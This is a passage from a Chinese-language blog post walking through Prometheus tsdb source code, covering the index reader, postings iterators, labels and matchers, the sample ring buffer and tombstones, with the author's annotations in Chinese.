w.buf1.putHash(w.crc32)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> w.write(w.buf1.get())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h5><p>实现了 <a href="https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fblock.go%23L61-L89" target="_blank" rel="noopener">IndexReader</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newReader</span><span class="params">(b ByteSlice, c io.Closer)</span> <span class="params">(*Reader, error)</span></span> &#123;</span><br><span class="line">    r := &amp;Reader&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Verify magic number.</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// toc 在文件尾部, 且长度固定, 因此可以直接读出</span></span><br><span class="line">    <span class="keyword">if</span> err := r.readTOC(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrap(err, <span class="string">"read TOC"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := r.readSymbols(<span class="keyword">int</span>(r.toc.symbols)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrap(err, <span class="string">"read symbols"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> err error</span><br><span class="line"></span><br><span class="line">    err = r.readOffsetTable(r.toc.labelIndicesTable, <span class="function"><span class="keyword">func</span><span class="params">(key []<span class="keyword">string</span>, off <span class="keyword">uint32</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">        <span class="comment">// 不知道这里为什么会强制长度为 1?</span></span><br><span class="line">        <span class="comment">// 根据 Writer.WriteLabelIndex 的定义, 明显是支持多 names 的</span></span><br><span class="line">        <span class="comment">// 实际验证, 多 names 写入没有问题, 但在读取的时候会在这里报错</span></span><br><span class="line">        <span class="comment">// 等待后续看相关代码来理解吧.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errors.Errorf(<span class="string">"unexpected key length %d"</span>, <span class="built_in">len</span>(key))</span><br><span class="line">        &#125;</span><br><span class="line">        r.labels[key[<span class="number">0</span>]] = off</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrap(err, <span class="string">"read label index table"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    err = r.readOffsetTable(r.toc.postingsTable, <span class="function"><span class="keyword">func</span><span class="params">(key []<span class="keyword">string</span>, off <span class="keyword">uint32</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrap(err, <span class="string">"read postings table"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.dec = &amp;DecoderV1&#123;symbols: r.symbols&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Postings"><a href="#Postings" class="headerlink" title="Postings"></a>Postings</h5><p>Posting 及其实现的具体作用, 待阅读剩余部分的代码后再回过头来确认.</p><p>这是一个 Iterator.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Postings provides iterative access over a postings list.</span></span><br><span class="line"><span class="keyword">type</span> Postings <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Next advances the iterator and returns true if another value was found.</span></span><br><span class="line">    Next() <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Seek advances the iterator to value v or greater and returns</span></span><br><span class="line">    <span class="comment">// true if a value was found.</span></span><br><span class="line">    Seek(v <span class="keyword">uint64</span>) <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// At returns the value at the current iterator position.</span></span><br><span class="line">    At() <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Err returns the last error of the iterator.</span></span><br><span class="line">    Err() error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给出了 Posting 的交集, 并集, 以及差集实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Intersect returns a new postings list over the intersection of the</span></span><br><span class="line"><span class="comment">// input postings.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Intersect</span><span class="params">(its ...Postings)</span> <span class="title">Postings</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(its) == <span class="number">0</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> emptyPostings</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(its) == <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> its[<span class="number">0</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  l := <span class="built_in">len</span>(its) / <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> newIntersectPostings(Intersect(its[:l]...), Intersect(its[l:]...))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> intersectPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">  a, b     Postings</span><br><span class="line">  aok, bok <span class="keyword">bool</span></span><br><span class="line">  cur      <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Merge returns a new iterator over the union of the input iterators.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Merge</span><span class="params">(its ...Postings)</span> <span class="title">Postings</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(its) == <span class="number">0</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> EmptyPostings()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(its) == <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> its[<span class="number">0</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  l := <span class="built_in">len</span>(its) / <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> newMergedPostings(Merge(its[:l]...), Merge(its[l:]...))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> mergedPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">  a, b        Postings</span><br><span class="line">  initialized <span class="keyword">bool</span></span><br><span class="line">  aok, bok    <span class="keyword">bool</span></span><br><span class="line">  cur         <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Without returns a new postings list that contains all elements from the full list that</span></span><br><span class="line"><span class="comment">// are not in the drop list</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Without</span><span class="params">(full, drop Postings)</span> <span class="title">Postings</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> newRemovedPostings(full, drop)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> removedPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">  full, remove Postings</span><br><span class="line"></span><br><span class="line">  cur <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line">  initialized <span class="keyword">bool</span></span><br><span class="line">  fok, rok    <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给出了几种特定类型的 Postings</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EmptyPostings returns a postings list that's always empty.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EmptyPostings</span><span class="params">()</span> <span class="title">Postings</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> emptyPostings</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ErrPostings returns new postings that immediately error.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ErrPostings</span><span class="params">(err error)</span> <span class="title">Postings</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> errPostings&#123;err&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// listPostings implements the Postings interface over a plain list.</span></span><br><span class="line"><span class="keyword">type</span> listPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">  list []<span class="keyword">uint64</span></span><br><span class="line">  cur  <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bigEndianPostings implements the Postings interface over a byte stream of</span></span><br><span class="line"><span class="comment">// big endian numbers.</span></span><br><span class="line"><span class="keyword">type</span> bigEndianPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">  list []<span class="keyword">byte</span></span><br><span class="line">  cur  <span class="keyword">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="MemPostings"><a href="#MemPostings" class="headerlink" title="MemPostings"></a>MemPostings</h5><p>label - posting idx 的映射记录器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MemPostings holds postings list for series ID per label pair. They may be written</span></span><br><span class="line"><span class="comment">// to out of order.</span></span><br><span class="line"><span class="comment">// ensureOrder() must be called once before any reads are done. This allows for quick</span></span><br><span class="line"><span class="comment">// unordered batch fills on startup.</span></span><br><span class="line"><span class="keyword">type</span> MemPostings <span class="keyword">struct</span> &#123;</span><br><span class="line">    mtx     sync.RWMutex</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// label 和 posting id 的关联</span></span><br><span class="line">    m       <span class="keyword">map</span>[labels.Label][]<span class="keyword">uint64</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 成功执行 EnsureOrder 之后置为 true</span></span><br><span class="line">    ordered <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="labels"><a href="#labels" class="headerlink" title="labels"></a>labels</h4><p><a href="https://link.jianshu.com?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Flabels" target="_blank" rel="noopener">labels</a> 是标签, 对应 influxdb 中的 tags, 即一组键值对.</p><p>在 promethues/tsdb 中, timestamp 和 value 之外的所有信息都放在 labels 中</p><p>这个 pkg 的核心就是 Label, Labels, 以及 Labels 的 Matcher</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Label is a key/value pair of strings.</span></span><br><span class="line"><span class="keyword">type</span> Label <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name, Value <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Labels is a sorted set of labels. Order has to be guaranteed upon</span></span><br><span class="line"><span class="comment">// instantiation.</span></span><br><span class="line"><span class="keyword">type</span> Labels []Label</span><br></pre></td></tr></table></figure><p>在实际使用中, Labels 都应该是应该排序的. 因此 Labels 首先实现了 <code>sort.Interface</code>.</p><p>同时, Labels 之间也是可以进行比较的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Compare compares the two label sets.</span></span><br><span class="line"><span class="comment">// The result will be 0 if a==b, &lt;0 if a &lt; b, and &gt;0 if a &gt; b.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Compare</span><span class="params">(a, b Labels)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    l := <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &lt; l &#123;</span><br><span class="line">        l = <span class="built_in">len</span>(b)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逐个 label 比较 name, value 的字母序</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; l; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> d := strings.Compare(a[i].Name, b[i].Name); d != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> d := strings.Compare(a[i].Value, b[i].Value); d != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// If all labels so far were in common, the set with fewer labels comes first.</span></span><br><span class="line">    <span class="comment">// 可比较的部分无法确定顺序, 则比较两者长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(a) - <span class="built_in">len</span>(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h5><p><code>Slice</code> 是 <code>Labels</code> 的切片</p><p>因为 <code>Labels</code> 可比较, 因此 <code>Slice</code> 也实现了 <code>sort.Interface</code></p><h5 id="Matcher"><a href="#Matcher" class="headerlink" title="Matcher"></a>Matcher</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Matcher specifies a constraint for the value of a label.</span></span><br><span class="line"><span class="keyword">type</span> Matcher <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Name returns the label name the matcher should apply to.</span></span><br><span class="line">    Name() <span class="keyword">string</span></span><br><span class="line">    <span class="comment">// Matches checks whether a value fulfills the constraints.</span></span><br><span class="line">    Matches(v <span class="keyword">string</span>) <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Matcher</code> 用来筛选 Labels</p><p>这里提供了 equal, prefix, regexp, not 四种基本的 <code>Matcher</code></p><h5 id="sampleRing"><a href="#sampleRing" class="headerlink" title="sampleRing"></a>sampleRing</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> sample <span class="keyword">struct</span> &#123;</span><br><span class="line">    t <span class="keyword">int64</span></span><br><span class="line">    v <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 既然是 Ring, 那么 buf 就是环装的, 因此有辅助的 i, f, l</span></span><br><span class="line"><span class="keyword">type</span> sampleRing <span class="keyword">struct</span> &#123;</span><br><span class="line">    delta <span class="keyword">int64</span></span><br><span class="line"></span><br><span class="line">    buf []sample <span class="comment">// lookback buffer</span></span><br><span class="line">    i   <span class="keyword">int</span>      <span class="comment">// position of most recent element in ring buffer</span></span><br><span class="line">    f   <span class="keyword">int</span>      <span class="comment">// position of first element in ring buffer</span></span><br><span class="line">    l   <span class="keyword">int</span>      <span class="comment">// number of elements in buffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sampleRing 用来处理数据点的采样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add adds a sample to the ring buffer and frees all samples that fall</span></span><br><span class="line"><span class="comment">// out of the delta range.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *sampleRing)</span> <span class="title">add</span><span class="params">(t <span class="keyword">int64</span>, v <span class="keyword">float64</span>)</span></span> &#123;</span><br><span class="line">    l := <span class="built_in">len</span>(r.buf)</span><br><span class="line">    <span class="comment">// Grow the ring buffer if it fits no more elements.</span></span><br><span class="line">    <span class="keyword">if</span> l == r.l &#123;</span><br><span class="line">        <span class="comment">// ring buffer 的扩容</span></span><br><span class="line">        buf := <span class="built_in">make</span>([]sample, <span class="number">2</span>*l)</span><br><span class="line">        <span class="built_in">copy</span>(buf[l+r.f:], r.buf[r.f:])</span><br><span class="line">        <span class="built_in">copy</span>(buf, r.buf[:r.f])</span><br><span class="line"></span><br><span class="line">        r.buf = buf</span><br><span class="line">        r.i = r.f</span><br><span class="line">        r.f += l</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        r.i++</span><br><span class="line">        <span class="keyword">if</span> r.i &gt;= l &#123;</span><br><span class="line">            r.i -= l</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.buf[r.i] = sample&#123;t: t, v: v&#125;</span><br><span class="line">    r.l++</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Free head of the buffer of samples that just fell out of the range.</span></span><br><span class="line">    <span class="comment">// 这里认为 add 是有序的, 将头部所有早于 `t - r.delta` 的数据点移出有效区域</span></span><br><span class="line">    <span class="keyword">for</span> r.buf[r.f].t &lt; t-r.delta &#123;</span><br><span class="line">        r.f++</span><br><span class="line">        <span class="keyword">if</span> r.f &gt;= l &#123;</span><br><span class="line">            r.f -= l</span><br><span class="line">        &#125;</span><br><span class="line">        r.l--</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="sampleRingIterator"><a href="#sampleRingIterator" class="headerlink" title="sampleRingIterator"></a>sampleRingIterator</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> sampleRingIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">    r *sampleRing</span><br><span class="line">    i <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sampleRingIterator 是 <a href="https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fquerier.go%23L668-L680" target="_blank" rel="noopener">SeriesIterator</a> 的实现</p><h5 id="BufferedSeriesIterator"><a href="#BufferedSeriesIterator" class="headerlink" title="BufferedSeriesIterator"></a>BufferedSeriesIterator</h5><p>BufferedSeriesIterator 同样也实现了 <a href="https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fquerier.go%23L668-L680" target="_blank" rel="noopener">SeriesIterator</a>, 它将一段部分数据点通过 sampleRing 缓存下来, 具体效果, 待阅读其他代码.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BufferedSeriesIterator wraps an iterator with a look-back buffer.</span></span><br><span class="line"><span class="keyword">type</span> BufferedSeriesIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">    it  tsdb.SeriesIterator</span><br><span class="line">    buf *sampleRing</span><br><span class="line"></span><br><span class="line">    lastTime <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewBuffer returns a new iterator that buffers the values within the time range</span></span><br><span class="line"><span class="comment">// of the current element and the duration of delta before.</span></span><br><span class="line"><span class="comment">// BufferedSeriesIterator 的作用是对上层 Iter 进行封装</span></span><br><span class="line"><span class="comment">// 将其中最多 delta 时间范围内的数据点通过 sampleRing 缓存下来</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBuffer</span><span class="params">(it tsdb.SeriesIterator, delta <span class="keyword">int64</span>)</span> *<span class="title">BufferedSeriesIterator</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;BufferedSeriesIterator&#123;</span><br><span class="line">        it:       it,</span><br><span class="line">        buf:      newSampleRing(delta, <span class="number">16</span>),</span><br><span class="line">        lastTime: math.MinInt64,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Seek</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Seek advances the iterator to the element at time t or greater.</span></span><br><span class="line"><span class="comment">// 这里的 `指针` 只会向后移动, 不会向前</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BufferedSeriesIterator)</span> <span class="title">Seek</span><span class="params">(t <span class="keyword">int64</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    t0 := t - b.buf.delta</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the delta would cause us to seek backwards, preserve the buffer</span></span><br><span class="line">    <span class="comment">// and just continue regular advancement while filling the buffer on the way.</span></span><br><span class="line">    <span class="comment">// 此时 sampleRing 中的点都会失效, 因此直接重置</span></span><br><span class="line">    <span class="keyword">if</span> t0 &gt; b.lastTime &#123;</span><br><span class="line">        b.buf.reset()</span><br><span class="line"></span><br><span class="line">        ok := b.it.Seek(t0)</span><br><span class="line">        <span class="keyword">if</span> !ok &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        b.lastTime, _ = b.At()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b.lastTime &gt;= t &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> b.Next() &#123;</span><br><span class="line">        <span class="keyword">if</span> b.lastTime &gt;= t &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tombstones-go"><a href="#tombstones-go" class="headerlink" title="tombstones.go"></a>tombstones.go</h4><p>Stone:</p><p>Stone 是作为删除数据的标记</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Stone holds the information on the posting and time-range</span></span><br><span class="line"><span class="comment">// that is deleted.</span></span><br><span class="line"><span class="keyword">type</span> Stone <span class="keyword">struct</span> &#123;</span><br><span class="line">    ref       <span class="keyword">uint64</span></span><br><span class="line">    intervals Intervals</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Interval-Intervals"><a href="#Interval-Intervals" class="headerlink" title="Interval, Intervals"></a>Interval, Intervals</h5><p>用来记录时间段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Interval represents a single time-interval.</span></span><br><span class="line"><span class="keyword">type</span> Interval <span class="keyword">struct</span> &#123;</span><br><span class="line">    Mint, 